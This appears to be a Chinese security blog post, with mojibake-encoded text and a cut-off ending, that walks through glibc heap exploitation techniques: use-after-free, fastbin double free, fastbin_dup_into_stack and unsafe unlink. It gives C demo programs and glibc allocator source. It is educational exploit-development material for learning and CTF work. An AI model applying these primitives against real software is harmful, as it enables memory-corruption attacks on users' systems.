    <content type="html"><![CDATA[<p>ÂõûÊ°£Âà∞Â†Ü</p><a id="more"></a><p><a href="https://lorexxar.cn/2021/05/19/lifesuibi/#ÂÜôÂú®ÊúÄÂêé" target="_blank" rel="noopener">ÂàõÂÆáÂõõÂπ¥ ¬∑ LoRexxar‚Äôs Blog</a></p><h1 id="0x01-glibcÂÜÖÂ≠òÁÆ°ÁêÜ"><a href="#0x01-glibcÂÜÖÂ≠òÁÆ°ÁêÜ" class="headerlink" title="0x01 glibcÂÜÖÂ≠òÁÆ°ÁêÜ"></a>0x01 glibcÂÜÖÂ≠òÁÆ°ÁêÜ</h1><h2 id="1-ptmallocÂÜÖÂ≠òÁÆ°ÁêÜ"><a href="#1-ptmallocÂÜÖÂ≠òÁÆ°ÁêÜ" class="headerlink" title="1. ptmallocÂÜÖÂ≠òÁÆ°ÁêÜ"></a>1. ptmallocÂÜÖÂ≠òÁÆ°ÁêÜ</h2><h3 id="Ê¶ÇËø∞"><a href="#Ê¶ÇËø∞" class="headerlink" title="Ê¶ÇËø∞"></a>Ê¶ÇËø∞</h3><p>ÊØè‰∏™ËøõÁ®ãÂè™Êúâ‰∏Ä‰∏™‰∏ªÂàÜÈÖçÂå∫Ôºå‰ΩÜÂèØËÉΩÂ≠òÂú®Â§ö‰∏™Èùû‰∏ªÂàÜÈÖçÂå∫</p><h1 id="0x02-first-fit"><a href="#0x02-first-fit" class="headerlink" title="0x02 first-fit"></a>0x02 first-fit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line"><span class="keyword">char</span>* c;</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ÁÆÄÂçïÁöÑUAFÊºèÊ¥û</p><p>Âà©Áî®Êù°‰ª∂ÔºöfreeÂêéÊåáÈíà‰∏çÊ∏ÖÁ©∫</p><p><strong>ÂΩ±ÂìçÔºöÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáCÊù•ÊéßÂà∂A</strong></p></blockquote><h1 id="0x03-fastbin-dup"><a href="#0x03-fastbin-dup" class="headerlink" title="0x03 fastbin_dup"></a>0x03 fastbin_dup</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>fastbin double free</p><p>Âà©Áî®Êù°‰ª∂ÔºöfreeÂêéÊåáÈíà‰∏çÊ∏ÖÁ©∫</p><p><strong>ÂΩ±ÂìçÔºöÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáCÊù•ÊéßÂà∂A</strong></p><p>ËøôÈáåÈÄöËøáÊåáÈíàcheckÔºåÊ≤°Ê£ÄÊü•ÂêéÁª≠ÊåáÈíà</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;fastbin ÁöÑÂ†ÜÂùóË¢´ÈáäÊîæÂêé next_chunk ÁöÑ pre_inuse ‰Ωç‰∏ç‰ºöË¢´Ê∏ÖÁ©∫</span><br><span class="line">&gt;fastbin Âú®ÊâßË°å <span class="built_in">free</span> ÁöÑÊó∂ÂÄô‰ªÖÈ™åËØÅ‰∫Ü main_arena Áõ¥Êé•ÊåáÂêëÁöÑÂùóÔºåÂç≥ÈìæË°®ÊåáÈíàÂ§¥ÈÉ®ÁöÑÂùó„ÄÇÂØπ‰∫éÈìæË°®ÂêéÈù¢ÁöÑÂùóÔºåÂπ∂Ê≤°ÊúâËøõË°åÈ™åËØÅ„ÄÇ</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">      record we are going to add (i.e., double free).  */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">       errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">       <span class="keyword">goto</span> errout;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="0x04-fastbin-dup-consolidate"><a href="#0x04-fastbin-dup-consolidate" class="headerlink" title="0x04 fastbin_dup_consolidate"></a>0x04 fastbin_dup_consolidate</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li>ÈáäÊîæp1‰πãÂêéÔºåÂÜçÂàÜÈÖçÂ§ßÂ†ÜÂùóÔºåÂ∞±‰ºömalloc_consolidateÔºåÂ∞Üp1ÊîæÂÖ•unsorted bin‰∏≠</li><li>ÁÑ∂ÂêéÊääp1ÊîæÂÖ•smallbin‰∏≠</li><li>Á®ãÂ∫èÁ¨¨‰∫åÊ¨°free chunk1ÔºåÂ∞±‰ºöÊää‰ªñÊîæÂà∞fastbin‰∏≠ÔºåÊ≠§Êó∂fastbinÂíåsmallbin‰∏≠Â∞±ÂêÑÊúâ‰∏Ä‰∏™0x40Â§ßÂ∞èÁöÑchunk</li><li>ËøôÊó∂ÁªßÁª≠Áî≥ËØ∑‰∏§‰∏™chunkÔºåÂ∞±ÂèØ‰ª•Áî≥ËØ∑Âà∞‰∏§‰∏™ÂêåÊ†∑ÂÜÖÂ≠òÂ§ßÂ∞èÁöÑchunk</li></ol><p>Âà©Áî®Êù°‰ª∂ÔºöÈ¶ñÂÖàÊàë‰ª¨ÂæóÊúâË∂≥Â§üÂ§ßÁöÑsizeÂèØ‰ª•Áî≥ËØ∑ÔºåÊ≠§Â§ñfree‰πãÂêé‰∏çËÉΩ‰∏∫Á©∫</p><p><strong>ÂΩ±ÂìçÔºöÊàë‰ª¨ÂèØ‰ª•ÂàÜÈÖç‰∏§ÂùóÊåáÂêëÂêå‰∏ÄÂùóÂÜÖÂ≠òÁöÑchunkÔºåÊ≠§Â§ñËøòÂèØ‰ª•ÊãøÂà∞libcÂü∫ÂùÄ</strong></p></blockquote><p>malloc_consolidateÂáΩÊï∞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T <span class="built_in">size</span>;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren't immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">          <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">            malloc_printerr (<span class="string">"malloc_consolidate(): invalid chunk size"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        check_inuse_chunk(av, p);</span><br><span class="line">        nextp = p-&gt;fd;</span><br><span class="line">        <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">        <span class="built_in">size</span> = chunksize (p);</span><br><span class="line">        nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);</span><br><span class="line">        nextsize = chunksize(nextchunk);</span><br><span class="line">        <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">          prevsize = prev_size (p);</span><br><span class="line">          <span class="built_in">size</span> += prevsize;</span><br><span class="line">          p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr (<span class="string">"corrupted size vs. prev_size in fastbins"</span>);</span><br><span class="line">          unlink_chunk (av, p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">          nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">          <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">            <span class="built_in">size</span> += nextsize;</span><br><span class="line">            unlink_chunk (av, nextchunk);</span><br><span class="line">          &#125; <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">          first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">          unsorted_bin-&gt;fd = p;</span><br><span class="line">          first_unsorted-&gt;bk = p;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (<span class="built_in">size</span>)) &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">          p-&gt;bk = unsorted_bin;</span><br><span class="line">          p-&gt;fd = first_unsorted;</span><br><span class="line">          set_foot(p, <span class="built_in">size</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">size</span> += nextsize;</span><br><span class="line">          set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">          av-&gt;top = p;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ëß£ÈáäÔºö</p><p>ÂàÜÈÖçlargebinÊó∂Ôºå‰ºöÂÖàÈÅçÂéÜ‰∏Ä‰∏ãfastbinÔºåÂ∞ÜÁõ∏ÈÇªÁöÑchunkÂêàÂπ∂ÔºåÈìæÊé•Âà∞unsortedbin‰∏≠ÔºåÁÑ∂ÂêéÁúãunsorted bin‰∏≠ÊòØÂê¶ÊúâÂêàÈÄÇÁöÑchunkÔºà‰∏äÊ¨°ÂàÜÈÖçË¢´‰ΩøÁî®ËøáÔºâÂèØ‰ª•Áõ¥Êé•ÂéªÂàáÂâ≤„ÄÇÂê¶ÂàôÔºåÂ∞±Ê†πÊçÆchunkÁ©∫Èó¥Â§ßÂ∞èÊîæÂÖ•small binÊàñlarge bin‰∏≠„ÄÇ</p><h1 id="0x05-fastbin-dup-into-stack"><a href="#0x05-fastbin-dup-into-stack" class="headerlink" title="0x05 fastbin_dup_into_stack"></a>0x05 fastbin_dup_into_stack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line"><span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line"><span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line"><span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line"><span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Âà©Áî®double free</p><ol><li>double free‰πãÂêé‰øÆÊîπAÁöÑfdÊåáÈíàÔºå‰∏∫Ê†à‰∏äÁöÑÂú∞ÂùÄ</li><li>Âç≥ÂèØÂÆåÊàêÊ†à‰∏ä‰ªªÊÑèÂÜô</li></ol><p>Âà©Áî®Êù°‰ª∂Ôºödouble freeÔºåÊ†à‰∏äÁöÑÂú∞ÂùÄ</p><p><strong>ÂΩ±ÂìçÔºöÂØπÊ†à‰∏ä‰ªªÊÑèÂÜô</strong></p></blockquote><h1 id="0x06-unsafe-unlink"><a href="#0x06-unsafe-unlink" class="headerlink" title="0x06 unsafe_unlink"></a>0x06 unsafe_unlink</h1><p><strong>unlinkÊòØÁî®Êù•Âπ≤‰ªÄ‰πàÁöÑÔºü‰ª•Âèä‰ªÄ‰πàÊó∂ÂÄôÂπ≤Ôºü</strong></p><p><strong>ÈÄöÂ∏∏ÂèñËµ∞ÂèåÂêëÈìæË°®ÁöÑchunkÂ∞±ÈúÄË¶ÅunlinkÔºåÈÄöÂ∏∏‰ºöÂèëÁîüÂú®ÂèåÂêëÈìæË°®‰∏≠</strong></p><ol><li>mallocËØ∑Ê±ÇÂêåÊ†∑Â§ßÂ∞èÁöÑlarge chunk</li><li>free‰∏≠ÂâçÔºàÂêàÂπ∂Áâ©ÁêÜÁõ∏ÈÇªÈ´òÁâ©ÁêÜÂú∞ÂùÄÁ©∫Èó≤chunkÔºâÂêéÔºàÂêàÂπ∂Áâ©ÁêÜÁõ∏ÈÇª‰ΩéÁâ©ÁêÜÂú∞ÂùÄÁ©∫Èó≤chunkÔºâÂêëÂêàÂπ∂</li><li>malloc_consolidateÂâçÂêéÂêëÂêàÂπ∂</li></ol><p>unlinkÁöÑ‰ª£Á†Å</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1344</span><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line"><span class="number">1345</span>     FD = P-&gt;fd;                                                               </span><br><span class="line"><span class="number">1346</span>     BK = P-&gt;bk;                                                               </span><br><span class="line"><span class="number">1347</span>     <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </span><br><span class="line"><span class="number">1348</span>       malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  </span><br><span class="line"><span class="number">1349</span>     <span class="keyword">else</span> &#123;                                                                    </span><br><span class="line"><span class="number">1350</span>         FD-&gt;bk = BK;                                                          </span><br><span class="line"><span class="number">1351</span>         BK-&gt;fd = FD;                                                          </span><br><span class="line"><span class="number">1352</span>         <span class="keyword">if</span> (!in_smallbin_range (P-&gt;<span class="built_in">size</span>)                                      </span><br><span class="line"><span class="number">1353</span>             &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                </span><br><span class="line"><span class="number">1354</span>             <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        </span><br><span class="line"><span class="number">1355</span>                 || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line"><span class="number">1356</span>               malloc_printerr (check_action,                                  </span><br><span class="line"><span class="number">1357</span>                                <span class="string">"corrupted double-linked list (not small)"</span>,    </span><br><span class="line"><span class="number">1358</span>   